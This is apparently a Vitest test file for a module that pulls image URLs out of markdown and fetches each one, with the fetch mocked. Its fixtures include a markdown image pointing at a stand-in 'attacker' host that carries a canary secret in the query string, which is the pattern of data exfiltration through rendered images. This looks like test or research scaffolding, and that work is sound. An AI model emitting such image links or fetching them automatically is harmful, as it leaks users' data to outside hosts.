import { describe, expect, it, vi } from "vitest";
import { createLogger } from "../logger.js";
import { extractImageUrls, fetchImageUrls } from "./image-fetch.js";

const logger = createLogger({ appName: "test" });

describe("extractImageUrls", () => {
  it("extracts http(s) URLs from markdown image syntax, in order", () => {
    const markdown =
      "a ![x](http://attacker:9000/log?s=CANARY-EXFIL-a1b2c3d4) b";

    expect(extractImageUrls(markdown)).toEqual([
      "http://attacker:9000/log?s=CANARY-EXFIL-a1b2c3d4",
    ]);
  });

  it("extracts multiple URLs in document order", () => {
    const markdown =
      "![a](https://one.example/x) text ![b](http://two.example/y)";

    expect(extractImageUrls(markdown)).toEqual([
      "https://one.example/x",
      "http://two.example/y",
    ]);
  });

  it("returns an empty array when there are no image URLs", () => {
    expect(extractImageUrls("no images here")).toEqual([]);
  });
});

describe("fetchImageUrls", () => {
  it("fetches every URL exactly once (the sink)", async () => {
    const fetchFn = vi.fn(async () => ({
      ok: true,
    })) as unknown as typeof fetch;

    await fetchImageUrls({ logger, fetchFn }, [
      "http://attacker:9000/a",
      "http://attacker:9000/b",
    ]);

    expect(fetchFn).toHaveBeenCalledTimes(2);
    expect(fetchFn).toHaveBeenNthCalledWith(1, "http://attacker:9000/a");
    expect(fetchFn).toHaveBeenNthCalledWith(2, "http://attacker:9000/b");
  });

  it("logs and swallows a failing fetch, then keeps going", async () => {
    const fetchFn = vi
      .fn()
      .mockRejectedValueOnce(new Error("network down"))
      .mockResolvedValueOnce({ ok: true }) as unknown as typeof fetch;

    await expect(
      fetchImageUrls({ logger, fetchFn }, [
        "http://attacker:9000/fails",
        "http://attacker:9000/ok",
      ]),
    ).resolves.toBeUndefined();

    expect(fetchFn).toHaveBeenCalledTimes(2);
  });
});
